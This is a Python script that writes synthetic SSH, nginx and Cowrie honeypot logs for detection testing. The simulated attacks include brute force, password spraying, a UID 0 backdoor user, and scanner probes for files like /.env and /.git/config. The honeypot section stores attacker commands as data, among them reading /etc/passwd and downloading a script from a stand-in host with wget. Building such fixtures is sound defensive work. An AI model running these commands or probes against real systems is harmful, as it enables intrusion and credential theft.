"""Generate deterministic synthetic logs with baked-in attack scenarios.

Produces:
  data/samples/auth.log       - SSH brute-force + successful compromise + user creation
  data/samples/nginx_access.log - Credential stuffing + scanner recon + admin probes
  data/samples/cowrie.json    - Honeypot brute-force session with attacker commands

The IPs used here are all documentation / TEST-NET ranges (RFC 5737).
"""
from __future__ import annotations

import argparse
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

# TEST-NET-1/2/3 ranges - safe to publish
_BAD_IPS = ["203.0.113.42", "198.51.100.17", "203.0.113.99", "198.51.100.221"]
_GOOD_IPS = ["203.0.113.5", "198.51.100.10"]
_USERS_COMMON = ["root", "admin", "user", "test", "ubuntu"]
_USERS_SPRAY = ["alice", "bob", "carol", "dave", "eve", "frank", "grace", "heidi",
                "ivan", "judy", "mallory", "nancy", "oscar"]


def _fmt_syslog(dt: datetime) -> str:
    return dt.strftime("%b %e %H:%M:%S").replace("  ", " ")


def gen_auth_log(path: Path, seed: int = 42) -> None:
    random.seed(seed)
    now = datetime(2026, 3, 5, 2, 14, 0)
    host = "victim-01"
    lines: list[str] = []

    # Baseline noise: occasional normal logins.
    for i in range(10):
        t = now - timedelta(hours=6) + timedelta(minutes=i * 20)
        ip = random.choice(_GOOD_IPS)
        lines.append(
            f"{_fmt_syslog(t)} {host} sshd[{1000 + i}]: "
            f"Accepted publickey for akash from {ip} port {random.randint(30000, 60000)} ssh2"
        )

    # Brute-force burst: 20 failed attempts from 203.0.113.42 within a minute.
    bf_ip = "203.0.113.42"
    for i in range(20):
        t = now + timedelta(seconds=i * 2)
        user = random.choice(_USERS_COMMON)
        lines.append(
            f"{_fmt_syslog(t)} {host} sshd[{2000 + i}]: "
            f"Failed password for {'invalid user ' if user == 'test' else ''}{user} "
            f"from {bf_ip} port {40000 + i} ssh2"
        )

    # Successful compromise: after 20 fails, accept root login (rule triggers).
    t = now + timedelta(seconds=45)
    lines.append(
        f"{_fmt_syslog(t)} {host} sshd[2100]: "
        f"Accepted password for root from {bf_ip} port 40099 ssh2"
    )

    # Attacker creates a new user (persistence).
    t = now + timedelta(seconds=90)
    lines.append(
        f"{_fmt_syslog(t)} {host} useradd[2101]: "
        f"new user: name=svcbackup, UID=0, GID=0, home=/root, shell=/bin/bash"
    )

    # Password spraying: 198.51.100.17 tries many users, few tries each.
    spray_ip = "198.51.100.17"
    t0 = now + timedelta(minutes=8)
    for i, user in enumerate(_USERS_SPRAY):
        t = t0 + timedelta(seconds=i * 20)
        lines.append(
            f"{_fmt_syslog(t)} {host} sshd[{3000 + i}]: "
            f"Failed password for invalid user {user} from {spray_ip} port {40000 + i} ssh2"
        )

    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def gen_nginx_log(path: Path, seed: int = 42) -> None:
    random.seed(seed)
    base = datetime(2026, 3, 5, 3, 0, 0)
    lines: list[str] = []

    def fmt(dt: datetime) -> str:
        return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")

    # Normal traffic
    for i in range(15):
        t = base - timedelta(minutes=random.randint(0, 240))
        ip = random.choice(_GOOD_IPS)
        lines.append(
            f'{ip} - - [{fmt(t)}] "GET /index.html HTTP/1.1" 200 1234 '
            f'"-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"'
        )

    # Credential stuffing: 25 failed POST /login from same IP in 45s.
    cs_ip = "203.0.113.99"
    for i in range(25):
        t = base + timedelta(seconds=i * 2)
        lines.append(
            f'{cs_ip} - - [{fmt(t)}] "POST /login HTTP/1.1" 401 48 '
            f'"-" "python-requests/2.31.0"'
        )

    # Scanner recon: sqlmap + nikto hitting sensitive endpoints.
    scan_ip = "198.51.100.221"
    scanner_agents = [
        "sqlmap/1.7.11#stable (https://sqlmap.org)",
        "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)",
        "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    ]
    probe_paths = ["/.env", "/wp-admin/", "/phpmyadmin/", "/.git/config",
                   "/admin/config.php", "/actuator/env"]
    for i, path_probe in enumerate(probe_paths):
        t = base + timedelta(minutes=2, seconds=i * 3)
        lines.append(
            f'{scan_ip} - - [{fmt(t)}] "GET {path_probe} HTTP/1.1" 404 162 '
            f'"-" "{random.choice(scanner_agents)}"'
        )

    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def gen_cowrie_log(path: Path, seed: int = 42) -> None:
    random.seed(seed)
    base = datetime(2026, 3, 5, 4, 0, 0)
    ip = "203.0.113.42"
    session = "abc123def456"
    lines: list[dict] = []

    for i in range(8):
        lines.append({
            "timestamp": (base + timedelta(seconds=i * 3)).isoformat() + "Z",
            "eventid": "cowrie.login.failed",
            "src_ip": ip,
            "username": random.choice(_USERS_COMMON),
            "password": random.choice(["123456", "password", "admin", "root"]),
            "session": session,
        })
    # Success
    lines.append({
        "timestamp": (base + timedelta(seconds=30)).isoformat() + "Z",
        "eventid": "cowrie.login.success",
        "src_ip": ip,
        "username": "root",
        "password": "123456",
        "session": session,
    })
    # Post-compromise recon commands
    for i, cmd in enumerate(["uname -a", "whoami", "cat /etc/passwd",
                             "wget http://malicious.example/x.sh", "chmod +x x.sh"]):
        lines.append({
            "timestamp": (base + timedelta(seconds=35 + i * 2)).isoformat() + "Z",
            "eventid": "cowrie.command.input",
            "src_ip": ip,
            "username": "root",
            "input": cmd,
            "session": session,
        })

    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        for entry in lines:
            f.write(json.dumps(entry) + "\n")


def main() -> int:
    p = argparse.ArgumentParser(description="Generate synthetic sample logs")
    p.add_argument("--out", default="data/samples", help="output directory")
    p.add_argument("--seed", type=int, default=42)
    args = p.parse_args()

    out = Path(args.out)
    gen_auth_log(out / "auth.log", seed=args.seed)
    gen_nginx_log(out / "nginx_access.log", seed=args.seed)
    gen_cowrie_log(out / "cowrie.json", seed=args.seed)
    print(f"Wrote synthetic logs to {out}/")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
